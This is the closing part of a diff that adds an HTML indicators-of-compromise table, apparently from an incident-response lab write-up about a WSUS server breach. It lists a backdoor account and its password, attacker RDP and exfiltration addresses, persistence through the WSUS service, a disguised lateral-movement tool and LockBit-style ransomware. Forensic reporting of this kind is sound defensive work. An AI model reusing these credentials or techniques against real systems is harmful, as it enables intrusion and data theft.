+        <tr><td>C2 Executable</td><td><code>C:\Program Files\Velociraptor\Velociraptor.exe</code></td><td>Installed Velociraptor executable</td></tr>
+        <tr><td>Backdoor Account</td><td><code>guestuser</code></td><td>Local account created and added to Remote Desktop Users</td></tr>
+        <tr><td>Backdoor Password</td><td><code>P@sswOrd456</code></td><td>Password assigned to the temporary local backdoor account</td></tr>
+        <tr><td>Attacker RDP IP</td><td><code>3.120.140.221</code></td><td>Source IP used for successful RDP sessions to WSUS-SERVER-01</td></tr>
+        <tr><td>Persistence Process</td><td><code>C:\Program Files\Update Services\Services\WsusService.exe</code></td><td>Legitimate WSUS service abused to repeatedly retrieve and execute the payload</td></tr>
+        <tr><td>Persistence Interval</td><td><code>600 seconds</code></td><td>Configured payload download and execution interval</td></tr>
+        <tr><td>Custom Tool</td><td><code>C:\Users\Public\ping.exe</code></td><td>Attacker-supplied executable masquerading as the Windows ping utility</td></tr>
+        <tr><td>Lateral Movement Target</td><td><code>http://10.10.11.61:8530</code></td><td>Argument supplied to the custom lateral-movement tool</td></tr>
+        <tr><td>Scanned Network</td><td><code>10.10.10.0/24</code></td><td>First /24 network scanned for live hosts</td></tr>
+        <tr><td>Scanned Network</td><td><code>10.10.11.0/24</code></td><td>Second /24 network scanned for live hosts</td></tr>
+        <tr><td>Scanned Port</td><td><code>8530</code></td><td>Default HTTP port for WSUS</td></tr>
+        <tr><td>Compromised Domain Account</td><td><code>dwalker</code></td><td>Domain user whose password was changed by the attacker</td></tr>
+        <tr><td>Changed Password</td><td><code>Sph!nky_00</code></td><td>Password assigned to the compromised domain account</td></tr>
+        <tr><td>Exfiltration Server</td><td><code>18.193.76.209:4000</code></td><td>Attacker-controlled HTTP server receiving uploaded files</td></tr>
+        <tr><td>Exfiltration Method</td><td><code>HTTP PUT</code></td><td>Unencrypted HTTP method used to upload 262 files</td></tr>
+        <tr><td>MITRE ATT&amp;CK</td><td><code>T1048.003</code></td><td>Exfiltration Over Unencrypted Non-C2 Protocol</td></tr>
+        <tr><td>Ransomware Extension</td><td><code>.xlockxlock</code></td><td>Extension appended to encrypted files</td></tr>
+        <tr><td>Ransomware Association</td><td><code>LockBit</code></td><td>Ransomware group associated with the observed extension and behavior</td></tr>
+        <tr><td>Failed Encryption Target</td><td><code>auxbase.xml</code></td><td>First file the ransomware failed to encrypt on WKSTN-01</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </main>
+</div>
+</body>
+</html>
